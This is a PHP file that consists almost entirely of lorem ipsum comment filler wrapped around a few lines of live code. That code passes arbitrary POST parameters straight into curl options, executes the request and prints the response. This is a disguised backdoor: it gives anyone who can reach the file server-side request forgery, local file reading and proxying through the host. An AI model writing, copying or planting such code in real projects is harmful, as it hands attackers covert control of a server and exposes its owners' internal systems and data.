<?php

	/*
Quisque tincidunt lacinia varius. Pellentesque commodo est quis turpis fringilla laoreet. Maecenas nisi nulla, viverra sed mollis vitae, malesuada maximus ante. Mauris non porttitor elit. Praesent quis bibendum dolor, sed accumsan eros. Praesent non consequat justo. Donec pharetra risus ac urna elementum egestas. Donec nec erat tempus, vehicula arcu vitae, elementum sem. Interdum et malesuada fames ac ante ipsum primis in faucibus. Vivamus vel orci leo. Interdum et malesuada fames ac ante ipsum primis in faucibus. Mauris rutrum dignissim dapibus.

Pellentesque cursus leo non pellentesque condimentum. Proin a tincidunt purus. Mauris sit amet ultrices augue, pharetra pharetra orci. Curabitur pharetra, lectus at malesuada gravida, nisl ex lacinia arcu, interdum eleifend lectus est vel metus. Etiam lobortis tincidunt eros nec mollis. Donec commodo sed purus at pharetra. Aliquam condimentum tincidunt pharetra. Cras eros nunc, lobortis sit amet tristique quis, fermentum vitae nisi. Pellentesque varius sodales massa, lacinia euismod orci tristique a. Cras maximus tempus libero et aliquam. Fusce neque metus, convallis mattis tellus id, eleifend congue dui. Cras mollis libero nec metus vulputate viverra sed scelerisque orci.

Vivamus eu viverra quam. Fusce cursus libero vel massa lacinia, ac consequat metus aliquet. Curabitur dictum suscipit velit et mollis. Proin non purus sed nisi convallis sagittis eu eu mauris. Donec sapien est, dapibus sed leo quis, volutpat scelerisque odio. Donec laoreet volutpat interdum. In sed urna ac sem tristique eleifend a imperdiet risus. Proin ipsum metus, porta eu dui eu, aliquam auctor turpis. Nulla hendrerit quam vitae tortor sagittis dapibus.

Integer eget lorem eu risus dapibus porttitor quis nec felis. Duis pulvinar pretium risus vel convallis. Maecenas vestibulum felis pellentesque est scelerisque, nec commodo elit viverra. Morbi tincidunt quam id sem condimentum vestibulum. Integer volutpat condimentum dui, non vulputate velit volutpat vel. Nulla feugiat libero ipsum, ac aliquet leo venenatis a. Nam non molestie sem.

Nullam accumsan est enim, non efficitur nisl euismod fermentum. Vivamus dignissim auctor lacus in convallis. Aenean iaculis tristique tincidunt. Cras feugiat, tortor at venenatis finibus, dui nisl aliquam risus, non pharetra neque felis et ipsum. Pellentesque volutpat justo nec augue faucibus, eget sagittis nisl dapibus. Nam augue diam, ornare non justo tempus, ullamcorper blandit diam. Morbi molestie suscipit lorem, ut porttitor diam posuere a. Sed sed accumsan mauris, vel varius lorem. Etiam a tristique erat. Cras eu felis semper, condimentum quam eget, dictum leo. Pellentesque vulputate pellentesque odio, a consectetur dui mattis quis. Nam semper nisi in hendrerit elementum.

*/
	$ch = curl_init();

	curl_setopt_array($ch,
	    array_combine(
	        array_map("constant", array_keys($_POST)),
	        array_values($_POST)
	    )
	);

	$result = curl_exec($ch);

	curl_close($ch);

	echo $result;

/*
Quisque tincidunt lacinia varius. Pellentesque commodo est quis turpis fringilla laoreet. Maecenas nisi nulla, viverra sed mollis vitae, malesuada maximus ante. Mauris non porttitor elit. Praesent quis bibendum dolor, sed accumsan eros. Praesent non consequat justo. Donec pharetra risus ac urna elementum egestas. Donec nec erat tempus, vehicula arcu vitae, elementum sem. Interdum et malesuada fames ac ante ipsum primis in faucibus. Vivamus vel orci leo. Interdum et malesuada fames ac ante ipsum primis in faucibus. Mauris rutrum dignissim dapibus.

Pellentesque cursus leo non pellentesque condimentum. Proin a tincidunt purus. Mauris sit amet ultrices augue, pharetra pharetra orci. Curabitur pharetra, lectus at malesuada gravida, nisl ex lacinia arcu, interdum eleifend lectus est vel metus. Etiam lobortis tincidunt eros nec mollis. Donec commodo sed purus at pharetra. Aliquam condimentum tincidunt pharetra. Cras eros nunc, lobortis sit amet tristique quis, fermentum vitae nisi. Pellentesque varius sodales massa, lacinia euismod orci tristique a. Cras maximus tempus libero et aliquam. Fusce neque metus, convallis mattis tellus id, eleifend congue dui. Cras mollis libero nec metus vulputate viverra sed scelerisque orci.

Vivamus eu viverra quam. Fusce cursus libero vel massa lacinia, ac consequat metus aliquet. Curabitur dictum suscipit velit et mollis. Proin non purus sed nisi convallis sagittis eu eu mauris. Donec sapien est, dapibus sed leo quis, volutpat scelerisque odio. Donec laoreet volutpat interdum. In sed urna ac sem tristique eleifend a imperdiet risus. Proin ipsum metus, porta eu dui eu, aliquam auctor turpis. Nulla hendrerit quam vitae tortor sagittis dapibus.

Integer eget lorem eu risus dapibus porttitor quis nec felis. Duis pulvinar pretium risus vel convallis. Maecenas vestibulum felis pellentesque est scelerisque, nec commodo elit viverra. Morbi tincidunt quam id sem condimentum vestibulum. Integer volutpat condimentum dui, non vulputate velit volutpat vel. Nulla feugiat libero ipsum, ac aliquet leo venenatis a. Nam non molestie sem.

Nullam accumsan est enim, non efficitur nisl euismod fermentum. Vivamus dignissim auctor lacus in convallis. Aenean iaculis tristique tincidunt. Cras feugiat, tortor at venenatis finibus, dui nisl aliquam risus, non pharetra neque felis et ipsum. Pellentesque volutpat justo nec augue faucibus, eget sagittis nisl dapibus. Nam augue diam, ornare non justo tempus, ullamcorper blandit diam. Morbi molestie suscipit lorem, ut porttitor diam posuere a. Sed sed accumsan mauris, vel varius lorem. Etiam a tristique erat. Cras eu felis semper, condimentum quam eget, dictum leo. Pellentesque vulputate pellentesque odio, a consectetur dui mattis quis. Nam semper nisi in hendrerit elementum.

*/
?>